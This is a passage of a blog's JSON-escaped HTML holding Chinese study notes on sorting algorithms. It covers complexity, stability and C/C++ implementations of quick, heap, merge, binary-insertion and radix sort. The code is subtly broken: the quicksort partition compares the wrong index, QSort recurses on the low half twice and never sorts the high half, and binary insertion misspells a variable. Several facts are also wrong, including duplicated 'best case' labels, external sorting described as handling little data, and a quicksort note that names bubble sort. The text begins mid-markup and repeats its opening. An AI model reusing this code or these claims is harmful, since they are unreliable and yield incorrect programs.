class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">Partition</span><span class=\"params\">(SqList &amp;L,<span class=\"keyword\">int</span> low,<span class=\"keyword\">int</span> high)</span></span>&#123;</span><br><span class=\"line\">    L.r[<span class=\"number\">0</span>]=L.r[low];</span><br><span class=\"line\">    pivotkey=L.r[low].key;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(low&lt;high)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(low&lt;high&amp;&amp;L.r[high].key&gt;=pivotkey)</span><br><span class=\"line\">            --high;</span><br><span class=\"line\">        L.r[low]=L.r[high];</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(low&lt;high&amp;&amp;L.r[high].key&lt;=pivotkey)</span><br><span class=\"line\">            ++low;</span><br><span class=\"line\">        L.r[high]=L.r[low];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    L.r[low]=L.r[<span class=\"number\">0</span>];</span><br><span class=\"line\">    <span class=\"keyword\">return</span> low;<span class=\"comment\">//返回枢轴最终的位置</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">QSort</span><span class=\"params\">(SqList &amp;L,<span class=\"keyword\">int</span> low,<span class=\"keyword\">int</span> high)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(low &lt;high)&#123;<span class=\"comment\">//low==high即各个子表都只有一个元素</span></span><br><span class=\"line\">        pivotloc=<span class=\"built_in\">Partition</span>(L,low,high);</span><br><span class=\"line\">        <span class=\"comment\">//将L.r[low...high]一分为二,pivotloc为枢轴元素排好序的位置</span></span><br><span class=\"line\">        <span class=\"built_in\">QSort</span>(L,low,pivotloc<span class=\"number\">-1</span>);<span class=\"comment\">//对低子表递归排序</span></span><br><span class=\"line\">        <span class=\"built_in\">QSort</span>(L,low,pivotloc<span class=\"number\">-1</span>);<span class=\"comment\">//对高子表递归排序     </span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">QSort</span>(L,<span class=\"number\">1</span>,L.length);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"时间复杂度O-nlog2n\"><a href=\"#时间复杂度O-nlog2n\" class=\"headerlink\" title=\"时间复杂度O(nlog2n)\"></a>时间复杂度O(nlog2n)</h5><ul>\n<li>QSort(); ——O(log2n)</li>\n<li>Partition();——-O(n)</li>\n</ul>\n<p>实验结果表明,就平均计算时间而言,快速排序是我们所讨论的所有内排序方法中最好的一个</p>\n<h5 id=\"空间复杂度-2\"><a href=\"#空间复杂度-2\" class=\"headerlink\" title=\"空间复杂度\"></a>空间复杂度</h5><p>快速排序不是原地排序</p>\n<p>由于程序中使用了递归,需要递归调用栈的支持,而栈的长度取决于递归调用的深度,(即使不用递归,也需要用用户栈)</p>\n<ul>\n<li>在平均情况下需要O(log2n)的栈空间</li>\n<li>最快情况下:栈空间可达O(n)</li>\n</ul>\n<h5 id=\"注意-1\"><a href=\"#注意-1\" class=\"headerlink\" title=\"注意\"></a>注意</h5><ul>\n<li>冒泡排序不适合对原本有序或者基本有序的记录序列进行排序,此时会退化成没有改进的<strong>冒泡排序</strong>时间复杂度O(n2)</li>\n</ul>\n<h3 id=\"简单选择排序\"><a href=\"#简单选择排序\" class=\"headerlink\" title=\"简单选择排序\"></a>简单选择排序</h3><p><strong>简单选择排序算法是不稳定的</strong></p>\n<p>基本思想:在待排序的数据中选出最大(小)的元素放在其最终的位置</p>\n<p>基本操作</p>\n<ol>\n<li>首先通过n-1次关键字比较,从n个记录中找出关键字最小的记录,将它与第一个记录交换</li>\n<li>再通过n-2次比较,从剩余的n-1个记录中找出关键字次小的记录,将它与第二个记录交换</li>\n<li>重复上述操作,共进行n-1趟排序后,排序结束</li>\n</ol>\n<p>移动次数</p>\n<ul>\n<li>最好情况 0</li>\n<li>最好情况 3(n-1)</li>\n</ul>\n<p><strong>比较次数是”定”值</strong>n(n-1)/2</p>\n<h5 id=\"时间复杂度-4\"><a href=\"#时间复杂度-4\" class=\"headerlink\" title=\"时间复杂度\"></a>时间复杂度</h5><p>O(n2)</p>\n<h3 id=\"堆排序\"><a href=\"#堆排序\" class=\"headerlink\" title=\"堆排序\"></a>堆排序</h3><p><strong>堆排序是不稳定的</strong></p>\n<p>若在输出对堆顶的最小值(最大值)后,使得剩余n-1个元素的序列又建成一个堆,则得到n个元素的次小值(次大值)….如此反复,便能得到一个有序序列,这个过程称之为堆排序</p>\n<h5 id=\"优点\"><a href=\"#优点\" class=\"headerlink\" title=\"优点\"></a>优点</h5><p>在数据元素各种情况下时间复杂度都是O(nlog2n)</p>\n<h4 id=\"如何调整剩余元素成为一个新的堆\"><a href=\"#如何调整剩余元素成为一个新的堆\" class=\"headerlink\" title=\"如何调整剩余元素成为一个新的堆\"></a>如何调整剩余元素成为一个新的堆</h4><h5 id=\"小根堆\"><a href=\"#小根堆\" class=\"headerlink\" title=\"小根堆\"></a>小根堆</h5><ol>\n<li>输出堆顶元素之后,以堆中最后一个元素替代之,(堆中元素一般用顺序存储结构)</li>\n<li>然后将根节点值与左,右子树的根节点值进行比较,并与区中小者进行交换</li>\n<li>重复上述操作,直到叶子结点,将得到新的堆,称这个从顶堆至叶子的调整过程为”筛选”</li>\n</ol>\n<h5 id=\"大根堆\"><a href=\"#大根堆\" class=\"headerlink\" title=\"大根堆\"></a>大根堆</h5><p>同上</p>\n<h4 id=\"堆的建立\"><a href=\"#堆的建立\" class=\"headerlink\" title=\"堆的建立\"></a>堆的建立</h4><p>单节点的二叉树是堆</p>\n<p>在完全二叉树中所有以叶子结点(序号i&gt;n/2)为根的子树是堆</p>\n<p>这样,只需依次将以序号为n/2,n/2-1,n/2-2,…,1的结点为根的子树均调整为堆即可</p>\n<h5 id=\"时间复杂度O-nlog2n-1\"><a href=\"#时间复杂度O-nlog2n-1\" class=\"headerlink\" title=\"时间复杂度O(nlog2n)\"></a>时间复杂度O(nlog2n)</h5><p>O(n)+O(nlog2n)=O(nlog2n)</p>\n<p>初始化堆所需时间不超过—O(n)</p>\n<p>排序阶段(不含初始化堆)—O(nlog2n)</p>\n<h5 id=\"空间复杂度O-1\"><a href=\"#空间复杂度O-1\" class=\"headerlink\" title=\"空间复杂度O(1)\"></a>空间复杂度O(1)</h5><h5 id=\"代码实现\"><a href=\"#代码实现\" class=\"headerlink\" title=\"代码实现\"></a>代码实现</h5><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">堆排序</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Heap</span> &#123;</span><span class=\"comment\">//创建堆对象</span></span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">       <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">heap</span><span class=\"params\">(<span class=\"keyword\">int</span> arr[],<span class=\"keyword\">int</span> lenth,<span class=\"keyword\">int</span> index)</span></span>&#123;<span class=\"comment\">//创建建立大根堆的函数</span></span><br><span class=\"line\">              <span class=\"keyword\">if</span> (lenth &lt;= <span class=\"number\">1</span>)</span><br><span class=\"line\">                      <span class=\"keyword\">return</span>;<span class=\"comment\">//当剩余长度小于等于1的时候推出</span></span><br><span class=\"line\">              <span class=\"keyword\">int</span> left = index * <span class=\"number\">2</span> + <span class=\"number\">1</span>;<span class=\"comment\">//左节点等于父节点*2+1</span></span><br><span class=\"line\">              <span class=\"keyword\">int</span> right = index * <span class=\"number\">2</span> + <span class=\"number\">2</span>;<span class=\"comment\">//右节点等于父节点*2+2</span></span><br><span class=\"line\">              <span class=\"keyword\">int</span> max = index;<span class=\"comment\">//初始化一个max为传入的根节点</span></span><br><span class=\"line\">              <span class=\"keyword\">if</span> (left&lt;lenth &amp;&amp; arr[left]&gt;arr[max])</span><br><span class=\"line\">                      max = left;<span class=\"comment\">//判断子节点是否大于父节点,并且更改max指向的值</span></span><br><span class=\"line\">              <span class=\"keyword\">if</span> (right&lt;lenth &amp;&amp; arr[right]&gt;arr[max])</span><br><span class=\"line\">                      max = right;</span><br><span class=\"line\">              <span class=\"keyword\">if</span> (arr[index] != arr[max]) &#123;<span class=\"comment\">//判断根节点是否为最大值,若不是则交换</span></span><br><span class=\"line\">                      <span class=\"built_in\">swap</span>(arr[index], arr[max]);</span><br><span class=\"line\">                      <span class=\"built_in\">heap</span>(arr, lenth, max);<span class=\"comment\">//递归调用,将</span></span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">                             </span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">       <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">heapSort</span><span class=\"params\">(<span class=\"keyword\">int</span> arr[], <span class=\"keyword\">int</span> size)</span> </span>&#123;</span><br><span class=\"line\">              <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = size / <span class=\"number\">2</span> - <span class=\"number\">1</span>; i &gt;= <span class=\"number\">0</span>; i--) &#123;</span><br><span class=\"line\">                      <span class=\"built_in\">heap</span>(arr, size, i);<span class=\"comment\">//建立一个大根堆</span></span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">              <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = size - <span class=\"number\">1</span>; i &gt;= <span class=\"number\">1</span>; i--) &#123;</span><br><span class=\"line\">                      <span class=\"built_in\">swap</span>(arr[<span class=\"number\">0</span>], arr[i]);</span><br><span class=\"line\">                      <span class=\"built_in\">heap</span>(arr, i, <span class=\"number\">0</span>);<span class=\"comment\">//重新调整大根堆</span></span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">       Heap A;</span><br><span class=\"line\">       <span class=\"keyword\">int</span> arr[<span class=\"number\">5</span>] = &#123; <span class=\"number\">5</span>,<span class=\"number\">7</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">8</span> &#125;;</span><br><span class=\"line\">       A.<span class=\"built_in\">heapSort</span>(arr, <span class=\"number\">5</span>);</span><br><span class=\"line\">       <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">5</span>; i++) &#123;</span><br><span class=\"line\">              cout &lt;&lt; arr[i] &lt;&lt; endl;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">       <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"归并排序\"><a href=\"#归并排序\" class=\"headerlink\" title=\"归并排序\"></a>归并排序</h3><p><strong>归并排序是稳定的</strong></p>\n<h5 id=\"时间复杂度O-nlog2n-2\"><a href=\"#时间复杂度O-nlog2n-2\" class=\"headerlink\" title=\"时间复杂度O(nlog2n)\"></a>时间复杂度O(nlog2n)</h5><h5 id=\"空间复杂度O-n\"><a href=\"#空间复杂度O-n\" class=\"headerlink\" title=\"空间复杂度O(n)\"></a>空间复杂度O(n)</h5><p>因为需要一个与原始序列同样大小的辅助序列,这正是此算法的缺点(归并排序后的值往辅助序列中填)</p>\n<h5 id=\"代码实现-递归\"><a href=\"#代码实现-递归\" class=\"headerlink\" title=\"代码实现(递归)\"></a>代码实现(递归)</h5><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;vector&gt;</span></span></span><br><span class=\"line\"><span class=\"comment\">//引入vector是为了定义可变数组</span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Merge</span> &#123;</span></span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">       <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">merge</span><span class=\"params\">(<span class=\"keyword\">int</span> arr[],<span class=\"keyword\">int</span> left,<span class=\"keyword\">int</span> mid,<span class=\"keyword\">int</span> right)</span> </span>&#123;</span><br><span class=\"line\">              <span class=\"function\">vector&lt;<span class=\"keyword\">int</span>&gt; <span class=\"title\">help</span><span class=\"params\">(right -left+<span class=\"number\">1</span>)</span></span>;</span><br><span class=\"line\">                  <span class=\"comment\">//定义一个长度为right -left+1的数组,进行内排</span></span><br><span class=\"line\">                <span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">              <span class=\"keyword\">int</span> p1 = left, p2 = mid+<span class=\"number\">1</span>;</span><br><span class=\"line\">              <span class=\"keyword\">while</span> (p1 &lt;= mid &amp;&amp; p2 &lt;= right) &#123;</span><br><span class=\"line\">                      help[i++] = arr[p1] &lt; arr[p2] ? arr[p1++] : arr[p2++];</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">              <span class=\"keyword\">while</span> (p1 &lt;= mid)</span><br><span class=\"line\">                      help[i++] = arr[p1++];</span><br><span class=\"line\">              <span class=\"keyword\">while</span> (p2 &lt;= right)</span><br><span class=\"line\">                      help[i++] = arr[p2++];</span><br><span class=\"line\">              <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt; help.<span class=\"built_in\">size</span>(); j++) &#123;</span><br><span class=\"line\">                      arr[left+j] = help[j];</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">       <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">mergeSort</span><span class=\"params\">(<span class=\"keyword\">int</span> arr[],<span class=\"keyword\">int</span> left,<span class=\"keyword\">int</span> right)</span> </span>&#123;</span><br><span class=\"line\">              <span class=\"keyword\">if</span> (left == right)</span><br><span class=\"line\">                      <span class=\"keyword\">return</span>;</span><br><span class=\"line\">              <span class=\"keyword\">int</span> mid = left + ((right-left)&gt;&gt; <span class=\"number\">1</span>);</span><br><span class=\"line\">              <span class=\"built_in\">mergeSort</span>(arr, left, mid);</span><br><span class=\"line\">              <span class=\"built_in\">mergeSort</span>(arr, mid + <span class=\"number\">1</span>, right);</span><br><span class=\"line\">              <span class=\"built_in\">merge</span>(arr, left, mid, right);</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">       Merge A;</span><br><span class=\"line\">       <span class=\"keyword\">int</span> arr[<span class=\"number\">10</span>] = &#123; <span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">6</span>,<span class=\"number\">1</span>,<span class=\"number\">4</span>,<span class=\"number\">3</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">9</span>,<span class=\"number\">87</span> &#125;;</span><br><span class=\"line\">       A.<span class=\"built_in\">mergeSort</span>(arr, <span class=\"number\">0</span>, <span class=\"number\">9</span>);</span><br><span class=\"line\">       <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++) &#123;</span><br><span class=\"line\">              cout &lt;&lt;<span class=\"string\">&quot;  &quot;</span>&lt;&lt; arr[i]&lt;&lt;flush;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">       <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"基数排序\"><a href=\"#基数排序\" class=\"headerlink\" title=\"基数排序\"></a>基数排序</h3><p>也叫桶排序或箱排序:设置若干个箱子,将关键字为k的记录放入第k个箱子,然后再按照序号将非空的连接</p>\n<p>数字是有范围的,只需要设置0-9十个箱子,相继按照个,十,百,….进行排序</p>\n<h5 id=\"基本思想-1\"><a href=\"#基本思想-1\" class=\"headerlink\" title=\"基本思想\"></a>基本思想</h5><p>分配+收集</p>\n<h5 id=\"步骤\"><a href=\"#步骤\" class=\"headerlink\" title=\"步骤\"></a>步骤</h5><ul>\n<li>第一趟收集保证个位有序</li>\n<li>第二趟收集保证十位有序</li>\n<li>………..</li>\n</ul>\n<h5 id=\"时间复杂度O-k-n-m\"><a href=\"#时间复杂度O-k-n-m\" class=\"headerlink\" title=\"时间复杂度O(k*(n+m))\"></a>时间复杂度O(k*(n+m))</h5><ul>\n<li>k: 关键字个数</li>\n<li>m: 关键字取值范围为m个值</li>\n</ul>\n<h5 id=\"空间复杂度O-n-m\"><a href=\"#空间复杂度O-n-m\" class=\"headerlink\" title=\"空间复杂度O(n+m)\"></a>空间复杂度O(n+m)</h5><h2 id=\"各种常见内排序算法复杂度以及稳定性表格\"><a href=\"#各种常见内排序算法复杂度以及稳定性表格\" class=\"headerlink\" title=\"各种常见内排序算法复杂度以及稳定性表格\"></a>各种常见内排序算法复杂度以及稳定性表格</h2><p>自己总结完再填</p>\n<table>\n<thead>\n<tr>\n<th>排序方法</th>\n<th>时间复杂度(平均)</th>\n<th>时间复杂度(最坏)</th>\n<th>时间复杂度(最好)</th>\n<th>空间复杂度</th>\n<th>稳定性</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>插入排序</td>\n<td>O(n2)</td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>希尔排序</td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>直接选择排序</td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n","site":{"data":{}},"excerpt":"<h2 id=\"排序\"><a href=\"#排序\" class=\"headerlink\" title=\"排序\"></a>排序</h2><h4 id=\"排序的分类\"><a href=\"#排序的分类\" class=\"headerlink\" title=\"排序的分类\"></a>排序的分类</h4><h5 id=\"按照存储介质可以分为\"><a href=\"#按照存储介质可以分为\" class=\"headerlink\" title=\"按照存储介质可以分为:\"></a>按照存储介质可以分为:</h5><ul>\n<li>内部排序: 数据量不大,数据在内存,无需内外村交换数据</li>\n<li>外部排序: 数据量不大,数据在外存 (文件排序)</li>\n</ul>\n<p>外部排序时,","more":"要将数据分批调入内存来排序,中间结果还要及时放入外存,显然外部排序更复杂</p>\n<h5 id=\"按照比较器个数可以分为\"><a href=\"#按照比较器个数可以分为\" class=\"headerlink\" title=\"按照比较器个数可以分为:\"></a>按照比较器个数可以分为:</h5><ul>\n<li>串行排序: 单处理机 (同一时刻比较一对元素)</li>\n<li>并行排序: 多处理机 (同一时刻比较多对元素)</li>\n</ul>\n<h5 id=\"按主要操作可分为\"><a href=\"#按主要操作可分为\" class=\"headerlink\" title=\"按主要操作可分为:\"></a>按主要操作可分为:</h5><ul>\n<li>比较排序:用比较的方法</li>\n</ul>\n<p>插入排序,交换排序,选择排序,归并排序</p>\n<ul>\n<li>基数排序:不比较元素的大小,仅仅根据元素本身的取值确定其有序位置</li>\n</ul>\n<h5 id=\"按辅助空间可分为\"><a href=\"#按辅助空间可分为\" class=\"headerlink\" title=\"按辅助空间可分为:\"></a>按辅助空间可分为:</h5><ul>\n<li>原地排序: 辅助空间用量为O(1)的排序方法</li>\n</ul>\n<p>(所占的辅助存储空间与参加排序的数据量大小无关)</p>\n<ul>\n<li>非原地排序: 辅助空间用量超过O(1)的排序方法</li>\n</ul>\n<h5 id=\"按稳定排序可分为\"><a href=\"#按稳定排序可分为\" class=\"headerlink\" title=\"按稳定排序可分为:\"></a>按稳定排序可分为:</h5><ul>\n<li>稳定排序:能够使任何数值相等的元素,排序前后相对次序不变</li>\n<li>非稳定排序:不是稳定排序的方法</li>\n</ul>\n<p><strong>排序的稳定性只对结构类型数据排序有意义</strong>,排序方法是否稳定并不能衡量一个排序算法的优劣</p>\n<h5 id=\"按自然性可分为\"><a href=\"#按自然性可分为\" class=\"headerlink\" title=\"按自然性可分为:\"></a>按自然性可分为:</h5><ul>\n<li>自然排序:输入数据越有序,排序的速度越快的排序方法</li>\n<li>非自然排序:不是自然排序的方法</li>\n</ul>\n<h2 id=\"插入排序\"><a href=\"#插入排序\" class=\"headerlink\" title=\"插入排序\"></a>插入排序</h2><h3 id=\"直接插入排序\"><a href=\"#直接插入排序\" class=\"headerlink\" title=\"直接插入排序\"></a>直接插入排序</h3><p>边插入边排序,保证子序列都是排好序的,选取元素插入到已经有序的序列中</p>\n<p>在插入排序中也可以使用哨兵,0号位置做哨兵</p>\n<h5 id=\"性能分析\"><a href=\"#性能分析\" class=\"headerlink\" title=\"性能分析\"></a>性能分析</h5><p>基本操作有两个,1.比较关键字大小,2.移动记录</p>\n<ul>\n<li>最好情况(已经有序)</li>\n</ul>\n<p>比较次数n-1,移动次数0</p>\n<ul>\n<li>最坏情况(逆序有序)</li>\n</ul>\n<p>比较次数n(n-1)/2</p>\n<h5 id=\"时间复杂度\"><a href=\"#时间复杂度\" class=\"headerlink\" title=\"时间复杂度\"></a>时间复杂度</h5><p>原始数据越接近有序,排序速度越快</p>\n<p>最坏情况下(逆序有序) O(n2)</p>\n<p>最好情况,已经有序,0+1+1+1…… -&gt;O(n)</p>\n<p>平均情况下耗时差不多是最坏情况的一半O(n2)</p>\n<h3 id=\"折半插入排序\"><a href=\"#折半插入排序\" class=\"headerlink\" title=\"折半插入排序\"></a>折半插入排序</h3><p>插入位置为high+1</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">BInsertSort</span><span class=\"params\">(SqList &amp;L)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">2</span>;i&lt;=length;i++)&#123;<span class=\"comment\">//以此插入第2-n个元素</span></span><br><span class=\"line\">        L.r[<span class=\"number\">0</span>]=L.r[i];<span class=\"comment\">//当前插入元素存到哨兵位置</span></span><br><span class=\"line\">        low =<span class=\"number\">1</span>;high=i<span class=\"number\">-1</span>;<span class=\"comment\">//采用二分查找法查找插入位置</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span>(low&lt;=high)&#123;</span><br><span class=\"line\">            mid =(low+high)/<span class=\"number\">2</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(L.r[<span class=\"number\">0</span>].key&lt;L.r[mid].key)&#123;</span><br><span class=\"line\">                hith = mid - <span class=\"number\">1</span>;           </span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                low =mid +<span class=\"number\">1</span>;</span><br><span class=\"line\">            &#125;            </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j=i<span class=\"number\">-1</span>;j&gt;=high+<span class=\"number\">1</span>;--j)&#123;</span><br><span class=\"line\">            L.r[j+<span class=\"number\">1</span>]=L.r[j];<span class=\"comment\">//移动元素</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        L.r[high+<span class=\"number\">1</span>]=L.r[<span class=\"number\">0</span>];<span class=\"comment\">//插入到正确位置</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>二分插入排序比较次数与待排序的记录的初始排列状态无关</strong></p>\n<p>在对象的初始排列已经有序或者接近有序的情况下,直接插入排序比较次数比折半插入排序少</p>\n<p>减少了比较次数,不能减少移动次数</p>\n<p>平均性能优于直接插入排序</p>\n<h5 id=\"时间复杂度-1\"><a href=\"#时间复杂度-1\" class=\"headerlink\" title=\"时间复杂度\"></a>时间复杂度</h5><p>O(n2)</p>\n<h5 id=\"空间复杂度\"><a href=\"#空间复杂度\" class=\"headerlink\" title=\"空间复杂度\"></a>空间复杂度</h5><p>O(1)</p>\n<p><strong>是一种稳定的排序方法</strong></p>\n<h3 id=\"希尔排序\"><a href=\"#希尔排序\" class=\"headerlink\" title=\"希尔排序\"></a>希尔排序</h3><p>基本思想:先将整个待排记录序列分割成若干子序列,分别进行直接插入排序,待整个序列中的记录”基本有序”时,再对全体记录进行一次直接插入排序</p>\n<h5 id=\"特点\"><a href=\"#特点\" class=\"headerlink\" title=\"特点\"></a>特点</h5><ul>\n<li>一次移动,移动位置较大,跳跃式地接近排序后的最终位置</li>\n<li>最后一次只需要少量移动</li>\n<li>增量序列必须是递减的,最后一个必须是1</li>\n<li>增量序列应该是<strong>互质</strong>的</li>\n</ul>\n<p>以特定间隔的元素分为一组进行插入排序,最后递减成1间隔的插入排序</p>\n<p>步骤</p>\n<ul>\n<li>1.定义增量序列Dk:DM&gt;DM-1&gt;…&gt;D1=1</li>\n<li>2.对每个Dk进行”Dk间隔”插入排序</li>\n</ul>\n<p>希尔排序算法是一种不稳定的排序算法</p>\n<h5 id=\"时间复杂度-2\"><a href=\"#时间复杂度-2\" class=\"headerlink\" title=\"时间复杂度\"></a>时间复杂度</h5><p>O(n1.25)~O(1.6n1.25) —-经验公式</p>\n<p>O(Nlog2N) —平均时间复杂度</p>\n<p>最差时间复杂度O(n2)</p>\n<h5 id=\"空间复杂度-1\"><a href=\"#空间复杂度-1\" class=\"headerlink\" title=\"空间复杂度\"></a>空间复杂度</h5><p>O(1) –本质还是插入排序</p>\n<h5 id=\"注意\"><a href=\"#注意\" class=\"headerlink\" title=\"注意:\"></a>注意:</h5><ul>\n<li>如何选取最佳增量序列,目前尚未解决</li>\n<li>增量因子中除1外没有公因子(也就是增量因子互质)，且最后一个增量因子必须为1</li>\n<li>不适合在链式存储结构上实现</li>\n</ul>\n<h2 id=\"交换排序\"><a href=\"#交换排序\" class=\"headerlink\" title=\"交换排序\"></a>交换排序</h2><h3 id=\"冒泡排序\"><a href=\"#冒泡排序\" class=\"headerlink\" title=\"冒泡排序\"></a>冒泡排序</h3><p><strong>冒泡排序算法是稳定的</strong></p>\n<h5 id=\"冒泡排序算法改进\"><a 